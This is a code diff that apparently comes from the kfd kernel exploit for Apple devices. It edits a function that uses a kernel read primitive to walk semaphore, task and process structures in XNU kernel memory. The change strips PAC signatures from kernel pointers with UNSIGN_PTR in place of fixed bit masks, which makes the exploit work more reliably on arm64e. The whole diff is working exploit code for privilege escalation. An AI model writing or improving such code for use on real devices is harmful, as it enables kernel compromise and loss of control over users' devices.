@@ -98,16 +98,21 @@ void kread_sem_open_find_proc(struct kfd* kfd)
 {
     volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
 
-    // Strip PAC tag (arm64e: top bits [63:39] are PAC/TBI)
-    u64 pseminfo_kaddr = pnode->pinfo & 0x0000007FFFFFFFFFull;
+    /*
+     * pnode->pinfo is a PAC-signed kernel pointer to pseminfo.
+     * Use UNSIGN_PTR to strip the PAC tag before passing to static_kget.
+     * Without this, on arm64e the upper bits contain a PAC signature which
+     * makes kread target a garbage kernel address, causing SIGSEGV.
+     */
+    u64 pseminfo_kaddr = UNSIGN_PTR(pnode->pinfo);
     if (!pseminfo_kaddr) return;
 
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
-    semaphore_kaddr &= 0x0000007FFFFFFFFFull;
+    semaphore_kaddr = UNSIGN_PTR(semaphore_kaddr);
     if (!semaphore_kaddr) return;
 
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
-    task_kaddr &= 0x0000007FFFFFFFFFull;
+    task_kaddr = UNSIGN_PTR(task_kaddr);
     if (!task_kaddr) return;
 
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
@@ -115,6 +120,7 @@ void kread_sem_open_find_proc(struct kfd* kfd)
 
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
+     * Use a bounded loop to avoid an infinite loop if the list is corrupted.
      */
     for (u64 iter = 0; iter < 1024; iter++) {
         i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
@@ -124,7 +130,7 @@ void kread_sem_open_find_proc(struct kfd* kfd)
         }
 
         u64 next = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
-        next &= 0x0000007FFFFFFFFFull;
+        next = UNSIGN_PTR(next);
         if (!next || next == proc_kaddr) break;
         proc_kaddr = next;
     }
